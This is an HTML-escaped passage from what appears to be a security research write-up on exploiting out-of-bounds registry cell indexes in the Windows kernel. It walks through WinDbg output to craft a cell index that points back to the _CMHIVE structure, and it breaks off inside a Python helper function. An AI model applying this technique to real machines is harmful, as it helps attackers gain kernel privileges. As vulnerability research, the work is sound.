 &lt;p class=&quot;ormwWEjHLs-c8&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgtTqu4Bgb-DFv0jEub16Ut4sCcwVuVft_Uaj8jjx0nQcLtSwd3YfuiTeU6UhH6rroRBXCh32joUDOt5Qk_F7OkV9PdjKdFOTYYZy5YLJfc51jxsuqkzM2zPE9xvhjw_GMCvOaHboCVplaaL4Cmg7iOlhdr4UgCjczxoWmAojS2lX9vkxDcJJ1b2Un18OY/s764/image6.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgtTqu4Bgb-DFv0jEub16Ut4sCcwVuVft_Uaj8jjx0nQcLtSwd3YfuiTeU6UhH6rroRBXCh32joUDOt5Qk_F7OkV9PdjKdFOTYYZy5YLJfc51jxsuqkzM2zPE9xvhjw_GMCvOaHboCVplaaL4Cmg7iOlhdr4UgCjczxoWmAojS2lX9vkxDcJJ1b2Un18OY/s764/image6.png&quot; border=&quot;0&quot; alt=&quot;A diagram illustrating the relationships between various system components, with &amp;quot;CMHIVE&amp;quot; as the central element in a rectangular box. Several components interact directly with &amp;quot;CMHIVE&amp;quot;: A box labeled &amp;quot;CM_KEY_SECURITY_CACHE_ENTRY&amp;quot; has an arrow pointing to &amp;quot;CMHIVE&amp;quot;. A box labeled &amp;quot;CMP_VOLUME_CONTEXT&amp;quot; has a two-way arrow connecting it to &amp;quot;CMHIVE&amp;quot;. A box labeled &amp;quot;CM_KEY_CONTROL_BLOCK&amp;quot; has a two-way arrow connecting it to &amp;quot;CMHIVE&amp;quot;. A box labeled &amp;quot;CM_RM&amp;quot; has a two-way arrow connecting it to &amp;quot;CMHIVE&amp;quot;. Other components are connected as follows: A box labeled &amp;quot;CM_KEY_SECURITY_CACHE&amp;quot; points to &amp;quot;CM_KEY_SECURITY_CACHE_ENTRY&amp;quot;. A box labeled &amp;quot;FILE_OBJECT&amp;quot; points to &amp;quot;CMP_VOLUME_CONTEXT&amp;quot;. A box labeled &amp;quot;CMP_VOLUME_MANAGER&amp;quot; has a two-way arrow with &amp;quot;CMP_VOLUME_CONTEXT&amp;quot;. A box labeled &amp;quot;CM_NAME_CONTROL_BLOCK&amp;quot; has a two-way arrow with &amp;quot;CM_KEY_CONTROL_BLOCK&amp;quot;. A box labeled &amp;quot;CM_KCB_LAYER_INFO&amp;quot; has a two-way arrow with &amp;quot;CM_KEY_CONTROL_BLOCK&amp;quot;. &amp;quot;CM_KEY_CONTROL_BLOCK&amp;quot; points to boxes labeled &amp;quot;CM_KEY_BODY&amp;quot;, &amp;quot;CM_TRANS&amp;quot;, and &amp;quot;CM_KCB_UOW&amp;quot;. A box labeled &amp;quot;KRESOURCEMANAGER&amp;quot; points to &amp;quot;CM_RM&amp;quot;. A box labeled &amp;quot;KTM&amp;quot; points to &amp;quot;CM_RM&amp;quot;. &quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;A diagram illustrating the relationships between various system components, with &amp;quot;CMHIVE&amp;quot; as the central element in a rectangular box. Several components interact directly with &amp;quot;CMHIVE&amp;quot;: A box labeled &amp;quot;CM_KEY_SECURITY_CACHE_ENTRY&amp;quot; has an arrow pointing to &amp;quot;CMHIVE&amp;quot;. A box labeled &amp;quot;CMP_VOLUME_CONTEXT&amp;quot; has a two-way arrow connecting it to &amp;quot;CMHIVE&amp;quot;. A box labeled &amp;quot;CM_KEY_CONTROL_BLOCK&amp;quot; has a two-way arrow connecting it to &amp;quot;CMHIVE&amp;quot;. A box labeled &amp;quot;CM_RM&amp;quot; has a two-way arrow connecting it to &amp;quot;CMHIVE&amp;quot;. Other components are connected as follows: A box labeled &amp;quot;CM_KEY_SECURITY_CACHE&amp;quot; points to &amp;quot;CM_KEY_SECURITY_CACHE_ENTRY&amp;quot;. A box labeled &amp;quot;FILE_OBJECT&amp;quot; points to &amp;quot;CMP_VOLUME_CONTEXT&amp;quot;. A box labeled &amp;quot;CMP_VOLUME_MANAGER&amp;quot; has a two-way arrow with &amp;quot;CMP_VOLUME_CONTEXT&amp;quot;. A box labeled &amp;quot;CM_NAME_CONTROL_BLOCK&amp;quot; has a two-way arrow with &amp;quot;CM_KEY_CONTROL_BLOCK&amp;quot;. A box labeled &amp;quot;CM_KCB_LAYER_INFO&amp;quot; has a two-way arrow with &amp;quot;CM_KEY_CONTROL_BLOCK&amp;quot;. &amp;quot;CM_KEY_CONTROL_BLOCK&amp;quot; points to boxes labeled &amp;quot;CM_KEY_BODY&amp;quot;, &amp;quot;CM_TRANS&amp;quot;, and &amp;quot;CM_KCB_UOW&amp;quot;. A box labeled &amp;quot;KRESOURCEMANAGER&amp;quot; points to &amp;quot;CM_RM&amp;quot;. A box labeled &amp;quot;KTM&amp;quot; points to &amp;quot;CM_RM&amp;quot;. &quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;The diagram is not necessarily complete, but it&lt;/span&gt;&lt;span&gt;&amp;nbsp;shows an overview of some objects that can be reached from _CMHIVE with a maximum of two pointer dereferences.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, it is important to remember that not every edge in this graph &lt;/span&gt;&lt;span&gt;will be&lt;/span&gt;&lt;span&gt;&amp;nbsp;traversable in practice.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This is because of two reasons: first, due the layout of the _HMAP_ENTRY structure (i.e. 0x18-byte alignment and the need for a 0x0 value being adjacent to the given pointer), and second, due to the fact that not every pointer in these objects is always initialized.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;For example, the _CMHIVE.RootKcb field is only valid for app hives (but not for normal hives), while _CMHIVE.CmRm is only set for standard hives, as app hives never have KTM transaction support enabled.&lt;/span&gt;&lt;span&gt;&amp;nbsp;So, the&lt;/span&gt;&lt;span&gt;&amp;nbsp;idea provides some good foundation for our exploit, but it does require additional experimentation to get every technical detail&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&amp;nbsp;right.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;Moving on, t&lt;/span&gt;&lt;span&gt;he !reg cellindex command in WinDbg is perfect for testing out-of-bounds cell indexes, because it uses the exact same cell map walk logic as HvpGetCellPaged&lt;/span&gt;&lt;span&gt;, and it doesn&amp;#39;t perform&lt;/span&gt;&lt;span&gt;&amp;nbsp;any additional bounds checks either.&lt;/span&gt;&lt;span&gt;&amp;nbsp;So, l&lt;/span&gt;&lt;span&gt;et&amp;#39;s stick with the HKCU hive we were working with earlier, and try to create a cell index that points back to its _CMHIVE structure.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;We&amp;#39;ll use the _CMHIVE &amp;rarr; _CM_RM &amp;rarr; _CMHIVE path for this.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The first decision we need to make is to choose the storage type for this index: stable (0) or volatile (1).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In the case of HKCU, both storage types are non-empty and use the &amp;quot;small dir&amp;quot; optimization, so we can choose either one; let&amp;#39;s say volatile.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Next, we need to calculate the directory index, which will be equal to the difference between the offsets of the _CMHIVE.CmRm and _CMHIVE.Hive.Storage[1].SmallDir&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&amp;nbsp;fields:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ormwWEjHLs-c19&quot;&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c11&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;dx&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;(&amp;amp;((nt!_CMHIVE*)0xffff82828fc1a000)-&amp;gt;Hive.Storage[1].SmallDir)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;(&amp;amp;((nt!_CMHIVE*)0xffff82828fc1a000)-&amp;gt;Hive.Storage[1].SmallDir)&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c41 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0xffff82828fc1a3a0&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;[Type:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;_HMAP_TABLE&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0xffff82828fe6a000&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;[Type:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;_HMAP_TABLE&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;dx&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;(&amp;amp;((nt!_CMHIVE*)0xffff82828fc1a000)-&amp;gt;CmRm)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;(&amp;amp;((nt!_CMHIVE*)0xffff82828fc1a000)-&amp;gt;CmRm)&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c41 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0xffff82828fc1b038&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;[Type:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;_CM_RM&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0xffff82828fdcc8e0&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;[Type:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;_CM_RM&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*]&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;In this case, it is (0xffff82828fc1b038 - 0xffff82828fc1a3a0) &amp;divide; 8 = &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c17&quot;&gt;0x193&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The next step is to calculate the table index, which will be the offset of the _CM_RM.CmHive field from the beginning of the structure, divided by the size of _HMAP_ENTRY (0x18).&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ormwWEjHLs-c19&quot;&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c11&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;dx&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;(&amp;amp;((nt!_CM_RM*)0xffff82828fdcc8e0)-&amp;gt;CmHive)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;(&amp;amp;((nt!_CM_RM*)0xffff82828fdcc8e0)-&amp;gt;CmHive)&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2 ormwWEjHLs-c41&quot;&gt;0xffff82828fdcc930&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;[Type:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;_CMHIVE&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0xffff82828fc1a000&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;[Type:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;_CMHIVE&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*]&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;So, the calculation is (0xffff82828fdcc930 - 0xffff82828fdcc8e0) &amp;divide; 0x18 = &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c17&quot;&gt;3&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Next, we can verify where the CmHive pointer falls within the _HMAP_ENTRY structure.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ormwWEjHLs-c19&quot;&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c11&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;dt&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;_HMAP_ENTRY&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0xffff82828fdcc8e0+3*0x18&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;nt!_HMAP_ENTRY&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;+0x000&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;BlockOffset&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;+0x008&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;PermanentBinAddress&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0xffff8282`8fc1a000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;+0x010&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;MemAlloc&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;The _CM_RM.CmHive pointer aligns with the PermanentBinAddress field, which is good news.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Additionally, the BlockOffset field is zero, which is also desirable.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Internally, it &lt;/span&gt;&lt;span&gt;corresponds to the ContainerSize field, which is zero&amp;#39;ed out if no KTM transactions have been performed on the hive during this session&lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;ndash; this will suffice for our example&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;We have now calculated three of the four cell index elements, and the last one is the offset, which we will set to zero, as we want to access the _CMHIVE structure from the very beginning.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;It is time to gather all this information in one place; we can build the final cell index using a simple Python function&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ormwWEjHLs-c19&quot;&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c11&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;def&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;MakeCellIndex(storage,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;directory,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;table,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 